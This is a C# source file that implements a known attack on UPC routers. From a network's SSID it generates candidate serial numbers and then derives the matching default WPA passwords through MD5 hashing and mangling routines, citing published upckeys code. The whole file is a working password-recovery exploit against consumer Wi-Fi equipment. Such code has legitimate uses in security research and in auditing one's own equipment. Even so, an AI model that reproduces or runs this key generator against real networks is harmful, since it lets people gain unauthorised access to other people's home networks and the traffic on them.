using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;

namespace Upc
{
    /// <summary>
    /// Class generation of the upc service keys
    /// <see cref="https://github.com/martinsuchan/upckeys"/>
    /// <see cref="http://haxx.in/upc_keys.c"/>
    /// </summary>
    public static class UpcKeyGen
    {
        /// <summary>
        /// Method to generate password candidates
        /// </summary>
        /// <param name="ssid">Network SSID</param>
        /// <param name="mode">Network mode (2.4, 5)</param>
        /// <returns>Collection of tuple serial number, password></returns>
        public static IEnumerable<Tuple<string, string>> GetCandidates(string ssid, Mode mode)
        {
            var target = Convert.ToUInt32(ssid.Substring(3), 10);

            foreach (var serial in GetSerials(mode, target))
            {
                var input1 = serial;
                if (mode == Mode.G5)
                {
                    var array = serial.ToCharArray();
                    Array.Reverse(array);
                    input1 = new string(array);
                }
                var h1 = ComputeMd5(input1);

                var hv = new uint[4];
                for (var i = 0; i < 4; i++)
                {
                    hv[i] = h1[i * 2] | (uint)h1[i * 2 + 1] << 8;
                }
                var w1 = Mangle(hv);

                for (var i = 0; i < 4; i++)
                {
                    hv[i] = h1[i * 2 + 8] | (uint)h1[i * 2 + 9] << 8;
                }
                uint w2 = Mangle(hv);

                string input2 = string.Format("{0:X8}{1:X8}", w1, w2);
                byte[] h2 = ComputeMd5(input2);

                string pass = Hash2Pass(h2);

                yield return new Tuple<string, string>(serial, pass);
            }
        }

        private const int Max0 = 9;
        private const int Max1 = 99;
        private const int Max2 = 9;
        private const int Max3 = 9999;
        private const uint Magic24Ghz = 0xff8d8f20;
        private const uint Magic5Ghz = 0xffd9da60;

        /// <summary>
        /// Method to generate serial keys
        /// </summary>
        /// <param name="mode">Network mode (2.4, 5)</param>
        /// <param name="target">Router number (postfix "UPC" prefix)</param>
        /// <returns></returns>
        private static IEnumerable<string> GetSerials(Mode mode, uint target)
        {
            var buf = new uint[4];
            var magic = mode == Mode.G24 ? Magic24Ghz : Magic5Ghz;

            for (buf[0] = 0; buf[0] <= Max0; buf[0]++)
            {
                for (buf[1] = 0; buf[1] <= Max1; buf[1]++)
                {
                    for (buf[2] = 0; buf[2] <= Max2; buf[2]++)
                    {
                        for (buf[3] = 0; buf[3] <= Max3; buf[3]++)
                        {
                            var serial = UpcGenerateSsid(buf, magic);
                            if (serial == target)
                            {
                                // TODO SAPP?
                                yield return string.Format("SAAP{0}{1:D2}{2}{3:D4}", buf[0], buf[1], buf[2], buf[3]);
                            }
                        }
                    }
                }
            }
        }

        private const ulong Magic0 = 0xb21642c9;
        private const ulong Magic1 = 0x68de3af;
        private const ulong Magic2 = 0x6b5fca6b;

        /// <summary>
        /// Method for conversion of hash to fina password
        /// </summary>
        /// <param name="hash">Byte array hash</param>
        /// <returns>Password</returns>
        private static string Hash2Pass(IReadOnlyList<byte> hash)
        {
            var pass = string.Empty;

            for (var i = 0; i < 8; i++)
            {
                var a = (uint)hash[i] & 0x1f;
                a -= (uint)((a * Magic0) >> 36) * 23;

                a = (a & 0xff) + 0x41;

                if (a >= 'I') a++;
                if (a >= 'L') a++;
                if (a >= 'O') a++;

                pass += (char)a;
            }
            return pass;
        }

        /// <summary>
        /// Helper method for mangeling 
        /// </summary>
        /// <param name="pp">Uint array</param>
        /// <returns>Mangeled number</returns>
        private static uint Mangle(IReadOnlyList<uint> pp)
        {
            var a = (uint)((pp[3] * Magic1) >> 40) - (pp[3] >> 31);
            var b = (pp[3] - a * 9999 + 1) * 11;

            return b * (pp[1] * 100 + pp[2] * 10 + pp[0]);
        }

        /// <summary>
        /// Method for SSID generation
        /// </summary>
        /// <param name="data">Uint array</param>
        /// <param name="magic">Magic number</param>
        /// <returns>Generated SSID (postfix after "UPC" prefix)</returns>
        private static uint UpcGenerateSsid(IReadOnlyList<uint> data, uint magic)
        {
            var a = data[1] * 10 + data[2];
            var b = data[0] * 2500000 + a * 6800 + data[3] + magic;

            return b - (uint)(((b * Magic2) >> 54) - (b >> 31)) * 10000000;
        }

        private static readonly HashAlgorithm Md5 = (HashAlgorithm)CryptoConfig.CreateFromName("MD5");

        /// <summary>
        /// Method for Md5 computation
        /// </summary>
        /// <param name="input"></param>
        /// <returns>Md5 array</returns>
        private static byte[] ComputeMd5(string input)
        {
            var bytes = Encoding.UTF8.GetBytes(input);
            return Md5.ComputeHash(bytes);
        }
    }

    /// <summary>
    /// Network mode enum
    /// </summary>
    public enum Mode
    {
        G24 = 0,
        G5 = 1
    }
}

